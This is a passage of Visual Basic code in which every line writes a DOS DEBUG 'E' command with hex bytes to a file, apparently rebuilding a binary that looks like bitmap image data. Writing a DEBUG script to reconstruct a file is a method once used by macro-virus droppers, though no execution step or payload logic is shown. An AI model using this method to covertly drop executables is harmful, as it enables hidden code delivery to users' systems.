Print #hFile, "E 8710 0F 18 2C 26 30 42 23 32 42 00 08 16 00 07 18 0E"
Print #hFile, "E 8720 10 28 2A 2F 50 43 4C 77 37 48 79 46 5B 8F 47 5B"
Print #hFile, "E 8730 8B 4D 61 91 55 66 99 64 75 A8 6A 7B AE 66 77 A8"
Print #hFile, "E 8740 8F 9D C7 BF CC F8 BB C6 FA BB C6 FF B8 C4 FA A7"
Print #hFile, "E 8750 B3 E9 8B 99 CE 7A 88 BD 79 87 BC 7A 88 BD 5E 6C"
Print #hFile, "E 8760 A1 40 4E 83 2F 3D 72 46 54 88 64 72 A7 6C 7D B0"
Print #hFile, "E 8770 72 80 B4 71 82 B5 6A 79 B1 62 73 AB 55 64 9C 44"
Print #hFile, "E 8780 55 8D 42 51 89 48 59 92 51 5F 99 53 61 9B 46 54"
Print #hFile, "E 8790 8E 37 46 7E 25 36 69 15 28 55 10 23 49 31 46 65"
Print #hFile, "E 87A0 3F 56 70 49 61 79 30 48 60 36 4E 66 2E 46 5E 45"
Print #hFile, "E 87B0 5D 75 4D 65 7B 4B 63 79 42 5A 70 41 59 6F 54 6D"
Print #hFile, "E 87C0 81 53 6C 80 56 6F 83 55 6E 82 52 6C 7D 6F 89 9A"
Print #hFile, "E 87D0 6B 85 96 56 70 81 6A 83 93 70 89 99 75 8D 9F 4F"
Print #hFile, "E 87E0 67 79 68 81 95 63 7C 90 70 89 9D 4F 68 7C 48 62"
Print #hFile, "E 87F0 73 59 73 84 75 8E 9E 87 9E AE 7D 92 A1 6B 81 8D"
Print #hFile, "E 8800 62 75 82 56 67 70 83 8E 96 5D 66 6A 31 36 39 38"
Print #hFile, "E 8810 3D 3E 82 86 87 03 08 09 00 00 F2 F7 F5 EC F1 EF"
Print #hFile, "E 8820 DF E1 E1 CF D1 D1 BE C0 C1 B5 B9 BA 02 05 0A D8"
Print #hFile, "E 8830 DE E3 DB E7 ED B2 C2 C8 CB DC E5 DF F2 FA A6 B8"
Print #hFile, "E 8840 C3 93 A5 B0 9F AF BC AF C0 CD C0 D4 DF 9C B4 C0"
Print #hFile, "E 8850 69 83 94 66 81 95 48 64 7C 4E 69 7E 65 7C 92 62"
Print #hFile, "E 8860 77 8C 54 67 7C 3D 52 68 35 49 62 21 34 4F 2E 3F"
Print #hFile, "E 8870 59 1E 2C 43 0C 15 29 22 2C 3D 1D 2D 3A 0D 1A 28"
Print #hFile, "E 8880 14 1B 2A 1F 23 3B 34 3D 5F 41 4E 7A 3C 4F 82 51"
Print #hFile, "E 8890 67 9B 5B 72 A4 67 7D AD 5F 72 A5 58 69 9C 5E 71"
Print #hFile, "E 88A0 A4 5C 6E 9D 83 91 BB B9 C7 F1 BF CC FF B3 BE F7"
Print #hFile, "E 88B0 A9 B5 EB A2 AE E4 88 96 CB 6E 7C B1 5E 6C A1 49"
Print #hFile, "E 88C0 57 8C 23 31 66 2F 3D 72 47 55 8A 63 71 A6 6F 7F"
Print #hFile, "E 88D0 B4 70 80 B5 71 82 B5 75 85 BA 66 77 AF 60 71 AA"
Print #hFile, "E 88E0 5F 70 A8 5C 6D A5 4B 5C 95 3B 4C 85 44 54 8F 5A"
Print #hFile, "E 88F0 6A A5 48 56 90 3A 49 81 29 3A 6D 19 2C 59 12 25"
Print #hFile, "E 8900 4B 32 47 67 3F 56 70 48 60 78 33 4B 63 38 50 68"
Print #hFile, "E 8910 32 4A 62 49 61 79 4E 66 7C 46 5E 74 3E 56 6C 41"
Print #hFile, "E 8920 59 6F 63 7C 90 4C 65 79 4E 67 7B 53 6C 80 5A 74"
Print #hFile, "E 8930 85 77 91 A2 5F 79 8A 51 6B 7C 75 8E 9E 76 8F 9F"
Print #hFile, "E 8940 6F 87 99 4C 66 77 6F 88 9C 62 7B 8F 70 89 9D 47"
Print #hFile, "E 8950 60 74 52 6C 7D 6D 87 98 79 90 A0 89 A0 AF 84 9A"
Print #hFile, "E 8960 A6 6A 80 8C 69 7D 88 5E 6F 78 77 84 8C 6C 77 7B"
Print #hFile, "E 8970 4D 54 57 3F 47 47 78 7D 7E 00 08 08 00 00 F5 FA"
Print #hFile, "E 8980 F8 EA EF ED DB DD DD CE D0 D0 C1 C3 C4 B8 BC BD"
Print #hFile, "E 8990 09 0C 11 EA F0 F5 DA E6 EC C0 D0 D6 D6 E7 F0 E0"
Print #hFile, "E 89A0 F3 FB B4 C6 D1 9E B0 BB 97 A7 B4 AB BC C9 BF D3"
Print #hFile, "E 89B0 DE A3 B9 C5 5E 78 89 5C 77 8B 4A 66 7E 4D 68 7D"
Print #hFile, "E 89C0 5E 76 8C 5F 77 8B 56 6B 80 41 56 6C 3A 4E 67 20"
Print #hFile, "E 89D0 33 4E 2C 3D 57 22 30 46 0C 16 28 22 2B 39 1C 2B"
Print #hFile, "E 89E0 34 1E 2D 36 19 21 2E 1B 20 35 30 39 5B 39 49 74"
Print #hFile, "E 89F0 3A 51 83 47 62 95 51 68 9A 64 7A AA 6B 7F AF 64"
Print #hFile, "E 8A00 75 A6 49 5C 8F 37 49 78 7B 8B B5 BE CC F6 BB C9"
Print #hFile, "E 8A10 FA B2 BE F4 A4 B0 E6 98 A4 DA 85 93 C8 7B 89 BE"
Print #hFile, "E 8A20 68 76 AB 3B 49 7E 2B 3B 70 4B 5B 90 5F 6F A4 66"
Print #hFile, "E 8A30 76 AB 68 79 AC 6D 7E B1 70 83 B6 65 77 AC 62 73"
Print #hFile, "E 8A40 AB 62 73 AB 64 75 AD 60 71 A9 4A 5E 95 33 46 7F"
Print #hFile, "E 8A50 2D 3F 7A 35 47 82 4A 5A 95 3A 4B 84 2B 3B 70 1A"
Print #hFile, "E 8A60 2C 5B 14 26 4F 33 48 68 41 56 71 49 5F 78 38 50"
Print #hFile, "E 8A70 68 3A 52 6A 32 4A 62 49 61 79 49 61 77 40 58 6E"
Print #hFile, "E 8A80 3D 55 6B 4A 62 78 5E 77 8B 41 5A 6E 50 69 7D 58"
Print #hFile, "E 8A90 71 85 61 7B 8C 77 91 A2 58 72 83 62 7C 8D 79 91"
Print #hFile, "E 8AA0 A3 7E 96 A8 61 7B 8C 5E 78 89 6F 88 9C 67 82 96"
Print #hFile, "E 8AB0 67 82 96 49 64 78 4B 65 76 6B 85 96 7A 91 A1 88"
Print #hFile, "E 8AC0 9F AE 84 9A A6 6B 7E 8B 67 79 84 65 76 7F 7D 8A"
Print #hFile, "E 8AD0 92 3F 4B 51 13 1C 1F 25 2F 2F 68 70 70 00 01 01"
Print #hFile, "E 8AE0 00 00 F0 F5 F3 E3 E8 E6 D9 DB DB D2 D4 D4 C4 C6"
Print #hFile, "E 8AF0 C7 B0 B4 B5 00 00 04 D3 D9 DE E5 F1 F7 DC EC F2"
Print #hFile, "E 8B00 D7 E8 F1 C8 DB E3 B4 C6 D1 A2 B4 BF 79 89 96 7F"
Print #hFile, "E 8B10 8F 9C C2 D4 DF AC C2 CE 57 6F 81 50 6B 7F 52 6E"
Print #hFile, "E 8B20 86 5A 74 8C 5B 73 89 55 6D 81 59 6E 83 45 5A 70"
Print #hFile, "E 8B30 3C 52 6B 1F 33 4C 2B 3D 54 25 34 47 0F 17 28 22"
Print #hFile, "E 8B40 2C 36 2A 3A 40 31 3F 45 1D 24 2D 1A 21 32 31 3C"
Print #hFile, "E 8B50 5C 3C 4C 76 3E 55 85 42 5D 8F 58 6F 9F 4A 61 8F"
Print #hFile, "E 8B60 55 67 96 72 83 B4 5D 6E 9F 3D 4F 7E 81 91 BB AD"
Print #hFile, "E 8B70 BB E5 B9 C7 F8 B5 C1 F7 A1 AD E3 8E 9B CF 85 93"
Print #hFile, "E 8B80 C8 8F 9D D1 79 87 BC 34 42 76 5C 6D A0 64 75 A8"
Print #hFile, "E 8B90 59 6A 9D 5D 6E A1 60 71 A4 5D 6E 9F 67 78 A9 5D"
Print #hFile, "E 8BA0 6E A1 5B 6B A0 62 72 A7 60 70 A5 54 66 9B 50 62"
Print #hFile, "E 8BB0 97 4E 62 99 3F 52 8B 2A 3D 76 4C 5C 97 3C 4D 86"
Print #hFile, "E 8BC0 2B 3B 70 1A 2C 5B 14 26 4F 34 48 6B 41 56 72 4A"
Print #hFile, "E 8BD0 60 79 3C 54 6C 3B 53 6B 31 49 61 47 5F 77 45 5D"
Print #hFile, "E 8BE0 73 3B 53 69 3F 57 6D 53 6B 81 4C 65 79 37 50 64"
Print #hFile, "E 8BF0 59 72 86 62 7B 8F 63 7D 8E 72 8C 9D 56 70 81 7B"
Print #hFile, "E 8C00 95 A6 78 90 A2 83 9D AE 56 70 81 73 8D 9E 6A 85"
Print #hFile, "E 8C10 99 6F 8A 9E 5F 7A 8E 50 6B 7F 58 72 83 74 8D 9D"
Print #hFile, "E 8C20 85 9C AC 88 9D AC 7C 8F 9C 5E 72 7D 51 64 6C 5B"
Print #hFile, "E 8C30 6C 75 7B 8B 92 75 83 89 59 65 67 3E 48 48 61 6B"
Print #hFile, "E 8C40 6B 02 0C 0C 00 00 F2 F7 F5 E7 EC EA DE E0 E0 CC"
Print #hFile, "E 8C50 CE CE C0 C2 C3 B7 BB BC 01 04 09 EB F1 F6 E8 F4"
Print #hFile, "E 8C60 FA ED FD FF DB EC F5 BE D1 D9 97 A9 B4 94 A6 B1"
Print #hFile, "E 8C70 BF CF DC C6 D6 E3 E4 F6 FF AA C0 CC 56 6E 80 57"
Print #hFile, "E 8C80 72 86 4D 69 81 5D 77 8F 58 70 86 5F 77 8D 5D 75"
Print #hFile, "E 8C90 89 50 67 7D 3A 50 69 22 36 4F 23 36 4B 24 34 45"
Print #hFile, "E 8CA0 04 0D 1A 22 2E 34 3C 4B 4D 31 41 40 2B 34 38 30"
Print #hFile, "E 8CB0 38 45 3F 4A 66 45 57 7C 47 5E 8C 4E 68 97 53 6A"
Print #hFile, "E 8CC0 97 54 67 92 4C 5C 8A 54 64 92 5E 6F A0 4B 5B 8A"
Print #hFile, "E 8CD0 58 68 93 A1 AE DA BC CA FB B6 C4 F8 A8 B6 EA 8D"
Print #hFile, "E 8CE0 9C CD 8E 9C D0 7E 8D BE 36 44 78 35 44 75 68 77"
Print #hFile, "E 8CF0 A8 56 65 96 51 60 91 58 68 97 58 68 97 55 65 94"
Print #hFile, "E 8D00 52 62 91 4D 5D 8C 50 5F 90 51 5F 93 5D 6B 9F 58"
Print #hFile, "E 8D10 69 9C 49 5C 8F 4C 5E 93 48 5C 93 33 47 7E 38 4B"
Print #hFile, "E 8D20 84 46 5A 91 29 3C 6F 1B 2D 5C 14 26 4F 2D 41 64"
Print #hFile, "E 8D30 4B 60 7C 48 5D 78 40 58 70 49 61 79 3A 52 6A 46"
Print #hFile, "E 8D40 5E 76 41 59 6F 32 4A 60 4C 64 7A 4F 67 7D 53 6C"
Print #hFile, "E 8D50 80 4B 64 78 52 6B 7F 5D 76 8A 6F 89 9A 69 83 94"
Print #hFile, "E 8D60 68 82 93 66 80 91 75 8E A2 7D 96 AA 53 6C 80 80"
Print #hFile, "E 8D70 9B AF 64 7F 94 60 7B 90 63 7E 92 4A 65 79 66 80"
Print #hFile, "E 8D80 91 76 8F 9F 8C A3 B3 8D A2 B1 5D 70 7D 4F 61 6C"
Print #hFile, "E 8D90 59 6A 73 66 78 7F 71 81 88 58 66 6C 2E 39 3D 08"
Print #hFile, "E 8DA0 14 16 49 55 57 00 0B 0D 00 00 EE F3 F1 E7 EC EA"
Print #hFile, "E 8DB0 DF E1 E1 CE D0 D0 C1 C3 C4 AF B3 B4 00 00 04 EC"
Print #hFile, "E 8DC0 F2 F7 DB E7 ED D4 E4 EA A7 B8 C1 A1 B4 BC C2 D4"
Print #hFile, "E 8DD0 DF D7 E9 F4 E1 F1 FE D5 E5 F1 DA EC F7 BB CF DA"
Print #hFile, "E 8DE0 6B 83 95 52 6D 82 44 60 78 4C 68 80 51 6C 81 6E"
Print #hFile, "E 8DF0 86 9C 5E 76 8A 51 68 7E 37 4E 64 22 37 4D 1E 32"
Print #hFile, "E 8E00 44 21 30 40 12 1C 26 2C 37 3B 35 46 43 41 50 4C"
Print #hFile, "E 8E10 38 42 42 2D 36 3F 3F 4A 60 50 61 82 4D 63 8C 45"
Print #hFile, "E 8E20 5D 87 3C 51 77 37 48 6F 39 48 6F 30 3D 69 3E 4E"
Print #hFile, "E 8E30 7D 35 45 74 33 43 6E 8B 9B C6 C2 D2 FF B0 BF F0"
Print #hFile, "E 8E40 AA B9 EA 8F 9F CE 7F 8E BF 4E 5E 8D 19 29 58 3C"
Print #hFile, "E 8E50 4C 7B 66 76 A4 56 65 93 4E 5D 8B 4B 5B 86 3F 4F"
Print #hFile, "E 8E60 7A 34 44 6F 32 42 6D 31 41 6C 36 43 71 35 42 70"
Print #hFile, "E 8E70 40 4F 7D 4A 5A 89 46 58 87 49 5D 8D 49 5C 8F 37"
Print #hFile, "E 8E80 4C 80 28 3D 71 47 5C 90 38 4C 7C 26 3B 68 16 29"
Print #hFile, "E 8E90 4F 29 3E 5E 4A 5F 7B 4D 62 7D 46 5E 76 4A 62 7A"
Print #hFile, "E 8EA0 38 50 68 41 59 71 43 5B 71 38 50 66 4D 65 7B 4A"
Print #hFile, "E 8EB0 62 78 4A 63 77 44 5D 71 4E 67 7B 5F 78 8C 70 8A"
Print #hFile, "E 8EC0 9B 5F 79 8A 60 7A 8B 68 82 93 77 90 A4 6A 85 99"
Print #hFile, "E 8ED0 54 6F 83 79 94 A8 67 82 97 67 82 97 62 7D 91 4F"
Print #hFile, "E 8EE0 6A 7E 68 80 92 7C 95 A5 8A 9F AE 7A 90 9C 58 6A"
Print #hFile, "E 8EF0 75 5C 6F 77 60 72 79 54 66 6D 54 64 6B 2F 3D 43"
Print #hFile, "E 8F00 1E 2A 2E 26 32 34 61 6D 6F 00 01 03 00 00 ED F2"
Print #hFile, "E 8F10 F0 E8 ED EB DF E1 E1 CF D1 D1 C2 C4 C5 AB AF B0"
Print #hFile, "E 8F20 00 00 04 E8 EE F3 EF FB FF B0 C0 C6 73 84 8D 9D"
Print #hFile, "E 8F30 B0 B8 DD EF FA D5 E7 F2 C4 D4 E1 C6 D6 E2 B8 C8"
Print #hFile, "E 8F40 D4 B8 CC D7 82 9A AC 59 74 89 53 6F 87 4F 6B 83"
Print #hFile, "E 8F50 48 63 78 60 78 8E 68 7F 95 58 6F 85 38 4F 65 28"
Print #hFile, "E 8F60 3D 52 23 35 46 21 31 3E 1B 26 2E 1D 29 2B 3F 4F"
Print #hFile, "E 8F70 48 4F 5E 56 40 4A 44 2F 38 3C 40 4A 5C 4E 5C 78"
Print #hFile, "E 8F80 46 5A 7D 3C 52 76 42 53 74 36 45 65 41 4D 71 30"
Print #hFile, "E 8F90 3A 62 38 45 71 2A 39 67 10 20 4B 68 78 A3 C6 D6"
Print #hFile, "E 8FA0 FF B4 C4 F3 B5 C5 F4 96 A6 D4 73 83 B2 25 35 63"
Print #hFile, "E 8FB0 19 29 54 52 62 8D 65 75 9F 54 62 8C 48 57 7E 42"
Print #hFile, "E 8FC0 51 78 37 46 6D 32 42 67 38 48 6D 3F 4C 72 43 4E"
Print #hFile, "E 8FD0 74 33 3D 65 2E 3A 62 39 47 71 3E 4F 7A 47 5A 87"
Print #hFile, "E 8FE0 4D 61 90 44 58 88 2B 40 73 4E 63 96 3E 52 82 26"
Print #hFile, "E 8FF0 3B 68 12 25 4B 28 3D 5D 4F 64 80 55 6B 84 4C 64"
Print #hFile, "E 9000 7C 48 60 78 36 4E 66 3E 56 6E 45 5D 73 3D 55 6B"
Print #hFile, "E 9010 4B 63 79 45 5D 73 3F 58 6C 43 5C 70 52 6B 7F 62"
Print #hFile, "E 9020 7B 8F 6E 88 99 59 73 84 5D 77 88 6C 86 97 81 9C"
Print #hFile, "E 9030 B0 5C 77 8C 5F 7A 8F 70 8D A2 68 85 9A 68 85 9A"
Print #hFile, "E 9040 56 71 85 4C 67 7B 75 8D 9F 83 9C AC 8A 9F AE 77"
Print #hFile, "E 9050 8D 99 5D 6F 7A 5B 6E 76 4E 60 67 32 42 49 50 61"
Print #hFile, "E 9060 6A 25 35 3C 1E 2A 2E 33 3F 41 5E 6A 6C 00 01 03"
Print #hFile, "E 9070 00 00 F2 F7 F5 EB F0 EE DF E1 E1 CB CD CD C0 C2"
Print #hFile, "E 9080 C3 B3 B7 B8 01 04 09 CC D2 D7 BF CB D1 8B 9B A1"
Print #hFile, "E 9090 77 88 91 AF C2 CA D1 E3 EE B3 C5 D0 9B AB B8 96"
Print #hFile, "E 90A0 A6 B2 90 A0 AC 9A AE B9 7D 93 A5 51 6C 81 5B 77"
Print #hFile, "E 90B0 8F 58 74 8C 46 60 78 48 60 76 73 8A A0 5E 75 8B"
Print #hFile, "E 90C0 38 4F 65 23 38 4D 15 27 38 13 21 2D 20 2A 31 22"
Print #hFile, "E 90D0 2C 2C 4B 5A 52 4F 5D 52 38 40 39 36 3B 3C 47 50"
Print #hFile, "E 90E0 5E 43 51 68 3A 4C 69 41 53 70 4D 5C 76 44 4F 6A"
Print #hFile, "E 90F0 4F 57 74 48 51 73 43 4F 77 26 36 60 0A 1A 44 3C"
Print #hFile, "E 9100 4C 76 AC BC EA B1 C1 EF B0 C0 EE 90 A0 CE 66 77"
Print #hFile, "E 9110 A2 1A 2B 56 3C 4C 76 60 6F 96 51 61 86 40 4D 73"
Print #hFile, "E 9120 38 46 6A 3D 49 6B 3C 48 6A 3D 4A 6A 42 4F 6F 47"
Print #hFile, "E 9130 52 72 3F 48 69 3A 43 65 37 41 63 3A 48 6C 38 48"
Print #hFile, "E 9140 6D 3B 4E 74 4B 5E 89 4A 5E 8D 32 46 76 4F 65 95"
Print #hFile, "E 9150 3E 52 81 29 3F 69 1C 2F 54 33 48 68 50 65 80 4B"
Print #hFile, "E 9160 61 7A 4B 63 7B 41 59 71 38 50 68 40 58 70 48 60"
Print #hFile, "E 9170 76 3A 52 68 43 5B 71 41 59 6F 39 52 66 4B 64 78"
Print #hFile, "E 9180 5A 73 87 63 7C 90 6A 84 95 57 71 82 62 7C 8D 70"
Print #hFile, "E 9190 8A 9B 86 A1 B6 50 6B 80 67 84 99 6A 87 9C 6D 8A"
Print #hFile, "E 91A0 9F 6B 88 9D 4C 67 7B 4F 6A 7E 7C 94 A6 7C 95 A5"
Print #hFile, "E 91B0 88 9D AC 8E A2 AD 85 98 A0 83 95 9C 83 93 9A 7C"
Print #hFile, "E 91C0 8C 93 82 91 9A 51 61 68 4A 56 5A 56 62 64 61 6D"
Print #hFile, "E 91D0 6F 00 01 03 00 00 F3 F8 F6 EA EF ED E0 E2 E2 CA"
Print #hFile, "E 91E0 CC CC BF C1 C2 BB BF C0 00 02 07 96 9C A1 59 65"
Print #hFile, "E 91F0 6B 6C 7C 82 74 85 8E 7E 91 99 92 A4 AF A6 B8 C3"
Print #hFile, "E 9200 B1 C1 CE A9 B9 C5 A2 B2 BE 9F B3 BE 8B A1 B3 51"
Print #hFile, "E 9210 6C 81 53 6F 87 58 74 8C 4E 68 80 45 60 75 69 81"
Print #hFile, "E 9220 97 63 7B 91 48 60 76 2C 44 58 1C 2F 3E 1A 28 34"
Print #hFile, "E 9230 2B 35 3C 2D 38 36 4A 59 51 49 57 4C 33 3A 33 3C"
Print #hFile, "E 9240 41 40 51 57 62 45 4F 61 3A 48 5F 3F 4D 64 2D 37"
Print #hFile, "E 9250 49 32 39 4C 34 39 4E 41 48 63 3B 47 69 2C 3C 61"
Print #hFile, "E 9260 31 43 68 35 46 6D 86 97 C2 A0 B3 DE 9A AB D6 86"
Print #hFile, "E 9270 97 C2 63 73 9D 26 37 5E 63 73 98 5E 6E 92 3C 4B"
Print #hFile, "E 9280 6C 30 3C 5E 33 3E 5E 3B 46 64 39 44 60 2F 3A 55"
Print #hFile, "E 9290 26 31 4C 21 2A 45 1B 22 3D 2A 30 4D 30 38 55 34"
Print #hFile, "E 92A0 3F 5D 2C 3B 5B 2F 3F 63 45 58 7E 4A 5D 88 2A 3F"
Print #hFile, "E 92B0 6C 4D 62 8F 40 55 82 31 47 70 25 38 5D 38 4D 6C"
Print #hFile, "E 92C0 51 66 81 4B 61 7A 43 5B 73 39 51 69 3E 56 6E 46"
Print #hFile, "E 92D0 5E 76 4A 62 78 32 4A 60 39 51 67 41 59 6F 3A 53"
Print #hFile, "E 92E0 67 4C 65 79 5A 73 87 62 7B 8F 65 7F 90 53 6D 7E"
Print #hFile, "E 92F0 65 7F 90 75 8F A0 77 92 A7 49 66 7B 68 84 9C 66"
Print #hFile, "E 9300 82 9A 72 8F A4 6D 8A 9F 4A 65 7A 5F 7A 8E 89 A1"
Print #hFile, "E 9310 B3 88 A1 B1 99 AE BD A3 B7 C2 A1 B4 BC 9C AE B5"
Print #hFile, "E 9320 A6 B6 BD AE BE C5 B3 C2 CB 7F 8C 94 75 81 87 87"
Print #hFile, "E 9330 92 96 76 81 85 00 06 0A 00 00 F1 F6 F4 E5 EA E8"
Print #hFile, "E 9340 E0 E2 E2 CD CF CF C1 C3 C4 B9 BD BE 00 00 04 6F"
Print #hFile, "E 9350 75 7A 77 83 89 98 A8 AE A0 B1 BA 9F B2 BA A7 B9"
Print #hFile, "E 9360 C4 A0 B2 BD 9F AF BC AE BE CA B8 C8 D4 AD C1 CC"
Print #hFile, "E 9370 A8 BE D0 68 83 98 52 6E 86 52 70 89 52 6C 84 49"
Print #hFile, "E 9380 64 79 50 68 7E 6B 83 99 60 78 8E 26 3E 52 10 23"
Print #hFile, "E 9390 32 19 28 31 2B 36 3A 30 3B 39 4B 58 50 51 5C 52"
Print #hFile, "E 93A0 3B 3F 39 3F 41 41 50 55 5E 45 4C 5D 32 3D 51 21"
Print #hFile, "E 93B0 2D 3F 18 1E 2B 27 2B 36 1E 21 30 2B 30 45 2B 35"
Print #hFile, "E 93C0 53 30 3F 60 54 65 86 47 5B 7E 76 8A B3 9C AF DA"
Print #hFile, "E 93D0 95 A6 D1 8E A0 C9 72 83 AA 3D 4F 74 6A 7A 9E 59"
Print #hFile, "E 93E0 68 89 49 56 76 3E 49 67 3D 48 64 41 4B 63 34 3E"
Print #hFile, "E 93F0 56 24 2C 43 18 21 35 10 19 2D 0E 12 2A 14 18 30"
Print #hFile, "E 9400 0E 15 2E 22 2B 46 34 40 5C 3B 4B 68 41 54 77 32"
Print #hFile, "E 9410 45 6B 22 35 60 47 5D 87 42 58 82 38 4F 75 27 3B"
Print #hFile, "E 9420 5E 34 49 68 52 67 82 55 6B 84 3B 53 6B 35 4D 65"
Print #hFile, "E 9430 46 5E 76 49 61 79 4A 62 78 2F 47 5D 35 4D 63 42"
Print #hFile, "E 9440 5A 70 3D 56 6A 43 5C 70 51 6A 7E 62 7B 8F 63 7D"
Print #hFile, "E 9450 8E 4E 68 79 69 83 94 77 92 A6 65 80 95 56 73 88"
Print #hFile, "E 9460 69 85 9D 68 84 9C 75 92 A7 67 84 99 47 62 77 6B"
Print #hFile, "E 9470 86 9A 88 A0 B4 8F A6 B6 96 AB BA 8D A1 AC 86 99"
Print #hFile, "E 9480 A1 81 93 9A 8A 98 9E 8A 98 9E 82 91 9A 64 71 79"
Print #hFile, "E 9490 5D 69 6F 6F 7A 7E 66 71 75 00 03 07 00 00 F1 F6"
Print #hFile, "E 94A0 F4 E3 E8 E6 DD DF DF D1 D3 D3 C3 C5 C6 B3 B7 B8"
Print #hFile, "E 94B0 00 00 04 79 7F 84 9B A7 AD 8E 9E A4 82 93 9C 8B"
Print #hFile, "E 94C0 9E A6 91 A3 AE 83 95 A0 95 A5 B2 C3 D3 DF B7 C7"
Print #hFile, "E 94D0 D3 A5 B9 C4 AE C4 D6 76 91 A6 54 70 88 52 70 89"
Print #hFile, "E 94E0 4F 69 81 46 60 78 46 5E 74 66 7E 94 66 7F 93 24"
Print #hFile, "E 94F0 3C 4E 11 24 33 17 26 2F 21 2C 30 3B 46 44 4D 59"
Print #hFile, "E 9500 53 4E 59 51 34 38 32 37 37 37 43 45 4F 39 3E 4D"
Print #hFile, "E 9510 25 2D 3E 08 11 1F 22 24 2E 2A 2C 34 21 23 2E 24"
Print #hFile, "E 9520 29 38 24 2E 46 24 32 4F 3C 4E 6B 4C 61 81 6B 80"
Print #hFile, "E 9530 A6 8E A4 CD 8D A1 CA 89 9C C2 69 7B A0 34 47 6A"
Print #hFile, "E 9540 32 43 64 31 40 60 50 5E 7A 3D 4A 64 33 3D 55 32"
Print #hFile, "E 9550 3B 4F 26 2F 43 1D 24 37 17 1F 30 13 1A 2B 0D 11"
Print #hFile, "E 9560 24 0B 0F 22 03 08 1D 23 2B 42 40 4C 64 42 50 6C"
Print #hFile, "E 9570 3C 4D 6E 22 35 5A 25 39 62 44 5A 83 3E 54 7D 3A"
Print #hFile, "E 9580 52 76 2C 41 61 35 4B 67 4F 65 7E 52 69 7F 37 4F"
Print #hFile, "E 9590 67 37 4F 67 4E 66 7E 47 5F 77 48 60 76 34 4C 62"
Print #hFile, "E 95A0 39 51 67 42 5A 70 3D 56 6A 3D 56 6A 4C 65 79 63"
Print #hFile, "E 95B0 7C 90 65 7F 90 54 6E 7F 74 8E 9F 7B 96 AA 53 6E"
Print #hFile, "E 95C0 83 6A 86 9E 69 85 9D 6E 8A A2 76 92 AA 5E 7A 92"
Print #hFile, "E 95D0 44 5F 74 75 90 A4 94 AC C0 8A A1 B1 76 8B 9A 54"
Print #hFile, "E 95E0 68 73 47 5A 62 3C 4E 55 3D 4B 51 34 42 48 37 46"
Print #hFile, "E 95F0 4F 3E 4A 54 3E 48 4F 4C 55 59 4F 58 5C 00 00 04"
Print #hFile, "E 9600 00 00 F6 F9 F7 E5 E8 E6 DB DD DD D2 D4 D4 C5 C7"
Print #hFile, "E 9610 C8 AE B1 B5 04 08 0D 99 A1 A8 B0 BB C3 9F AF B6"
Print #hFile, "E 9620 93 A4 AD 88 9A A5 89 9B A6 AF BF CB DC EC F8 ED"
Print #hFile, "E 9630 FD FF DB EB F7 BB CC D9 B8 CF DF 81 9A AE 5D 77"
Print #hFile, "E 9640 8F 5B 77 8F 4F 6B 83 45 5F 77 4B 65 7D 53 6B 81"
Print #hFile, "E 9650 69 82 96 61 79 8B 72 85 94 50 60 6C 23 2D 34 35"
Print #hFile, "E 9660 3E 41 47 54 52 3C 45 42 1C 21 20 28 29 2D 37 39"
Print #hFile, "E 9670 43 29 2F 3C 1D 24 33 06 0D 1C 10 15 1E 12 14 1E"
Print #hFile, "E 9680 1A 1C 27 1C 23 32 25 30 46 17 26 40 1A 2B 46 51"
Print #hFile, "E 9690 65 84 8A 9F C5 AB C1 EA B4 C8 F1 A6 B8 E1 81 92"
Print #hFile, "E 96A0 B9 4B 5B 80 1F 2E 4F 33 40 60 3B 47 63 1F 2B 43"
Print #hFile, "E 96B0 11 19 30 0F 18 2C 0E 15 28 0A 12 23 04 0C 1D 00"
Print #hFile, "E 96C0 04 15 02 06 18 0E 12 24 0E 14 27 26 2F 43 2E 3A"
Print #hFile, "E 96D0 52 27 36 50 3A 4A 67 3E 51 72 43 57 7A 4B 61 85"
Print #hFile, "E 96E0 31 47 6B 2B 41 65 25 3A 5A 35 4B 67 4F 67 7F 51"
Print #hFile, "E 96F0 69 7F 37 4F 67 39 53 6B 51 6B 83 43 5B 73 46 5E"
Print #hFile, "E 9700 74 3B 53 69 3F 57 6D 41 5A 6E 3C 55 69 3E 57 6B"
Print #hFile, "E 9710 4E 67 7B 65 7E 92 67 81 92 60 7A 8B 82 9C AD 7F"
Print #hFile, "E 9720 98 AC 40 5B 70 73 8E A3 66 80 98 70 8C A4 78 94"
Print #hFile, "E 9730 AC 5D 79 91 4A 65 7A 84 9D B1 9F B6 C6 87 9C AB"
Print #hFile, "E 9740 73 84 91 5F 70 79 61 71 78 54 64 6A 52 60 66 4C"
Print #hFile, "E 9750 5A 60 50 5C 66 5C 68 72 58 62 69 60 69 6D 5A 63"
Print #hFile, "E 9760 67 00 00 04 00 00 F5 F5 F5 E9 E9 E9 E3 E3 E3 D1"
Print #hFile, "E 9770 D1 D1 BD BF C0 B2 B5 B9 00 00 04 9B A4 AD AE BA"
Print #hFile, "E 9780 C4 A5 B3 BF 9E AE BB 9A AB B8 8F 9F AC C6 D6 E2"
Print #hFile, "E 9790 E2 F0 FC EA F8 FF E9 F9 FF CA DB E8 A7 B9 CA 93"
Print #hFile, "E 97A0 A9 BB 6F 87 9D 57 71 89 6A 86 9E 42 5D 77 3C 57"
Print #hFile, "E 97B0 71 54 6E 86 7F 97 AD 72 88 9A 92 A4 B5 6D 7D 8A"
Print #hFile, "E 97C0 16 22 2C 30 3B 43 47 51 58 38 41 45 17 1D 22 15"
Print #hFile, "E 97D0 1B 22 2C 32 3D 31 39 46 20 29 37 04 0D 1B 12 19"
Print #hFile, "E 97E0 28 13 1C 2A 19 21 32 22 2C 3E 29 34 4A 12 20 37"
Print #hFile, "E 97F0 0E 1C 33 00 0B 28 4D 62 88 83 99 C3 8D A0 CD 84"
Print #hFile, "E 9800 94 C2 83 93 BE 6A 78 A2 3F 4A 70 1C 26 48 13 1B"
Print #hFile, "E 9810 38 29 30 49 0F 17 2E 05 0C 20 0E 15 29 0D 14 28"
Print #hFile, "E 9820 0D 14 28 00 07 1B 0A 12 23 16 1E 2F 32 3B 4F 1E"
Print #hFile, "E 9830 28 40 12 1D 38 13 1F 3B 35 43 5F 70 81 9C 7C 8E"
Print #hFile, "E 9840 AB 66 7A 99 4D 61 84 27 3B 5E 24 39 59 2C 44 62"
Print #hFile, "E 9850 56 6F 89 50 6A 82 31 4C 66 3F 5A 74 4D 69 81 3F"
Print #hFile, "E 9860 59 71 47 5F 75 30 48 5E 37 4F 63 43 5B 6D 44 5C"
Print #hFile, "E 9870 6E 3E 56 68 58 70 82 69 81 93 62 7A 8E 76 8E A2"
